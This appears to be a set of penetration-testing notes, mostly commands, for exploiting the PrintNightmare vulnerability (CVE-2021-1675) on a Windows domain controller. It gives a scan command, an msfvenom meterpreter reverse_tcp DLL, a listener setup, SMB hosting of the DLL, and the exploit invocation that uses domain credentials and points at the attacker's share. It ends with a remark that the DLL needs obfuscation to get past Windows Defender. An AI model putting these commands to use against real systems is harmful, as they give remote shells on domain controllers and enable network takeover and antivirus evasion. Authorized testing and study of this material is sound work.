Resources:
- cube0x0 RCE - https://github.com/cube0x0/CVE-2021-1675
- calebstewart LPE - https://github.com/calebstewart/CVE-2021-1675

# Scan for vulnerable hosts

Scan DC to see if its vulnerable:
```bash
rpcdump.py @<dc-ip> | egrep 'MS-RPRN|MS-PAR'
```

# Exploitation

Steps:
1. Create a reverse_tcp DLL with *msfvenom*
2. Setup a (meterpreter) listener
3. 2. Host the DLL
4. Run the exploit

Create a reverse_tcp DLL with msfvenom:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f dll > shell.dll
```

Setup listener:
```msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lport <port>
run
```

Host the DLL:
```bash
smbserver.py <share-name> <dir> -smb2support
smbserver.py share `pwd` -smb2support
```

Run the exploit:
```bash
python3 CVE-2021-1675.py <AD-FQDN>/<domain-user>:<password>@<dc-ip> '\\<attacker-ip>\share\shell.dll'
```

>[!Note] Windows Defender
>Windows Defender blocks the DLL created with msfvenom. In a real engagement we would need to obfuscate the DLL.